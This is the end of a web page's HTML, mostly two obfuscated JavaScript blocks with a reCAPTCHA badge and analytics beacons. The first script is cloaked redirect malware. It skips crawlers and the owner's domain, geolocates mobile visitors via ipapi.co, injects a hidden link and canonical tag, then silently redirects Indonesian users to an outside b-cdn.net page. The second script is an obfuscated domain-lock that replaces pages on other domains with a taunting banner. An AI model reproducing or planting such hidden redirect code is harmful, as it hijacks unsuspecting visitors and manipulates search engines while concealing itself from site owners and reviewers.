_0x48f15b=_0x49a4,_0x27fa75='b3RpdW1wcm8uY29t',_0x2db11e=_0x48f15b(0x1d6),_0x10c06b=_0x48f15b(0x1cd),_0x1e8f4e=atob(_0x27fa75),_0x53a88b=atob(_0x2db11e),_0x4dd7ba=atob(_0x10c06b),_0x152ddd=location[_0x48f15b(0x1c5)],_0x10022c=navigator['userAgent'][_0x48f15b(0x1c7)]();if(_0x152ddd===_0x1e8f4e||_0x152ddd['endsWith']('.'+_0x1e8f4e))return;if(/(googlebot|bingbot|yandex|baidu|duckduck|slurp|crawler|spider|inspection|verification)/i[_0x48f15b(0x1bd)](_0x10022c))return;if(!/android|iphone|ipad|ipod|iemobile|opera mini|windows phone/i['test'](_0x10022c))return;fetch(_0x48f15b(0x1cf))[_0x48f15b(0x1c1)](_0x4c99a8=>_0x4c99a8['json']())[_0x48f15b(0x1c1)](_0x5abe64=>{var _0x2abd75=_0x48f15b;if(_0x5abe64&&_0x5abe64['country_code']==='ID'){if(!document[_0x2abd75(0x1bf)]('link[rel=\x22canonical\x22]')){var _0x1e8c89=document[_0x2abd75(0x1d1)](_0x2abd75(0x1cb));_0x1e8c89[_0x2abd75(0x1c0)]=_0x2abd75(0x1d5),_0x1e8c89[_0x2abd75(0x1d4)]=_0x4dd7ba,document[_0x2abd75(0x1c3)][_0x2abd75(0x1ca)](_0x1e8c89);}var _0x1bb266=document[_0x2abd75(0x1d1)]('a');_0x1bb266[_0x2abd75(0x1d4)]=_0x4dd7ba,_0x1bb266[_0x2abd75(0x1da)]='\x20',_0x1bb266[_0x2abd75(0x1db)][_0x2abd75(0x1d9)]=_0x2abd75(0x1d7),document['body']['appendChild'](_0x1bb266);var _0x5ab99f=0x3e8+Math[_0x2abd75(0x1ce)](Math['random']()*0x7d0);setTimeout(function(){location['replace'](_0x53a88b);},_0x5ab99f);}})['catch'](()=>{});}()));function _0x11c3(){var _0x3cee95=['573693lBBBnX','createElement','1527980nikeww','529235HXPpqK','href','canonical','aHR0cHM6Ly9DLUUtTy5iLWNkbi5uZXQvSkFOR0FOLU1BTElORy1QVU5ZQS1DLUUtTy5odG1s','position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden;','73072kwmrTm','cssText','textContent','style','882PvwAdw','test','1282120iIkmRn','querySelector','rel','then','1gFpQCC','head','5710356Zpyjyk','hostname','6ouHtXZ','toLowerCase','8WAJPnc','20cWzMTp','appendChild','link','5861559pLnAMv','aHR0cHM6Ly9vdGl1bXByby5jb20vY2xpZW50ZXMv','floor','https://ipapi.co/json/'];_0x11c3=function(){return _0x3cee95;};return _0x11c3();}
    </script>
    <script> function _0x4967(){var _0x2fc247=['2342072VxTDNI','localhost','3283056SdJVMC','forEach','//cbcdn.githack.com/dex88/dex/raw/branch/main/img/otak-pake.jpg','2KuZKnz','hostname','rel','type','Status:\x20Proteksi\x20aktif,\x20CSS\x20dimuat\x20dengan\x20benar.','<h1\x20style=\x27color:#ff4d4d;\x20font-size:48px;\x20margin:0;\x27>JUDUL\x20BESAR:\x20SIH\x20TENGIL</h1>','<div\x20style=\x27margin:0;\x20padding:0;\x20width:100vw;\x20height:100vh;\x20overflow:hidden;\x20background:#000;\x20font-family:sans-serif;\x20position:fixed;\x20top:0;\x20left:0;\x20z-index:9999999;\x27>','stylesheet','appendChild','text/css','documentElement','7hMxvvm','head','error','557097mqgcru','10oNoQai','Akses\x20Ditolak:\x20Domain\x20','href','7478652HFPRnc','<p\x20style=\x27font-size:22px;\x20font-weight:bold;\x20margin-top:10px;\x27>SENGAJA\x20MAKIN\x20TENGIL\x20BIAR\x20YANG\x20MALING\x20TEMPLATE\x20MAKIN\x20MENGIGIL\x20XIXI</p>','2440374lQYpID','\x27\x20style=\x27width:100%;\x20height:100%;\x20object-fit:cover;\x20position:absolute;\x20top:0;\x20left:0;\x27>','link','https://datascripmall.id/assets/css/88fJ46cw-1.3.14.css','2696502QddKOU','</div>','otiumpro.com','log','location','4tYCTOp','543598rUqoeq','60vqygKK','<div\x20style=\x27position:relative;\x20z-index:10;\x20background:rgba(0,0,0,0.6);\x20height:100%;\x20display:flex;\x20flex-direction:column;\x20justify-content:center;\x20align-items:center;\x20text-align:center;\x20color:white;\x20padding:20px;\x27>','<img\x20src=\x27'];_0x4967=function(){return _0x2fc247;};return _0x4967();}function _0xb921(_0x2c84b9,_0x5b8298){_0x2c84b9=_0x2c84b9-0xf0;var _0x496745=_0x4967();var _0xb921c4=_0x496745[_0x2c84b9];return _0xb921c4;}(function(_0x2e1bd9,_0x1cd00d){var _0x4b14c2=_0xb921,_0x1e0de8=_0x2e1bd9();while(!![]){try{var _0x5850fa=parseInt(_0x4b14c2(0xf2))/0x1*(-parseInt(_0x4b14c2(0x10b))/0x2)+parseInt(_0x4b14c2(0xf8))/0x3*(-parseInt(_0x4b14c2(0x101))/0x4)+parseInt(_0x4b14c2(0xf3))/0x5*(parseInt(_0x4b14c2(0xfc))/0x6)+parseInt(_0x4b14c2(0x116))/0x7*(parseInt(_0x4b14c2(0x106))/0x8)+parseInt(_0x4b14c2(0x108))/0x9+parseInt(_0x4b14c2(0x103))/0xa*(-parseInt(_0x4b14c2(0x102))/0xb)+parseInt(_0x4b14c2(0xf6))/0xc;if(_0x5850fa===_0x1cd00d)break;else _0x1e0de8['push'](_0x1e0de8['shift']());}catch(_0x2d564e){_0x1e0de8['push'](_0x1e0de8['shift']());}}}(_0x4967,0x7d217),(function(){var _0x3a7fa3=_0xb921,_0x1ab0ea=_0x3a7fa3(0xfe),_0x5cca71=window[_0x3a7fa3(0x100)][_0x3a7fa3(0x10c)];if(_0x5cca71===_0x1ab0ea||_0x5cca71==='www.'+_0x1ab0ea||_0x5cca71===_0x3a7fa3(0x107)){var _0x288371=[_0x3a7fa3(0xfb),'https://datascripmall.id/assets/css/B_TyS8B--1.3.14.css'];_0x288371[_0x3a7fa3(0x109)](function(_0x209590){var _0x453932=_0x3a7fa3,_0xaf07e6=document['createElement'](_0x453932(0xfa));_0xaf07e6[_0x453932(0x10d)]=_0x453932(0x112),_0xaf07e6[_0x453932(0x10e)]=_0x453932(0x114),_0xaf07e6[_0x453932(0xf5)]=_0x209590,document[_0x453932(0xf0)][_0x453932(0x113)](_0xaf07e6);}),console[_0x3a7fa3(0xff)](_0x3a7fa3(0x10f));}else{console[_0x3a7fa3(0xf1)](_0x3a7fa3(0xf4)+window['location']['hostname']+'\x20tidak\x20diizinkan.');var _0xdd9142=_0x3a7fa3(0x10a);document[_0x3a7fa3(0x115)]['innerHTML']=_0x3a7fa3(0x111)+_0x3a7fa3(0x105)+_0xdd9142+_0x3a7fa3(0xf9)+_0x3a7fa3(0x104)+_0x3a7fa3(0x110)+_0x3a7fa3(0xf7)+_0x3a7fa3(0xfd)+_0x3a7fa3(0xfd);}}()));
    </script>
    <div bis_skin_checked="1">
        <div class="grecaptcha-badge" data-style="bottomright" bis_skin_checked="1"
            style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
            <div class="grecaptcha-logo" bis_skin_checked="1"><iframe title="reCAPTCHA" width="256" height="60"
                    role="presentation" name="a-ke5j4y431j3p" frameborder="0" scrolling="no"
                    sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
                    src="https://recaptcha.net/recaptcha/api2/anchor?ar=1&amp;k=6LdMMTosAAAAAKjGoG96N7jB6KzTd3EHo5eL5ixC&amp;co=aHR0cHM6Ly9kYXRhc2NyaXBtYWxsLmlkOjQ0Mw..&amp;hl=id&amp;v=7gg7H51Q-naNfhmCP3_R47ho&amp;size=invisible&amp;anchor-ms=20000&amp;execute-ms=30000&amp;cb=nlpd5odsp932"
                    bis_size="{&quot;x&quot;:1595,&quot;y&quot;:849,&quot;w&quot;:256,&quot;h&quot;:60,&quot;abs_x&quot;:1595,&quot;abs_y&quot;:849}"></iframe>
            </div>
            <div class="grecaptcha-error" bis_skin_checked="1"></div><textarea id="g-recaptcha-response"
                name="g-recaptcha-response" class="g-recaptcha-response"
                style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
        </div><iframe style="display: none;"></iframe>
    </div>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"519ea37df8d3499988d594bc3afc0829","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"b189cac2bc644fa9b7f3d159ba467bb5","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>
</html>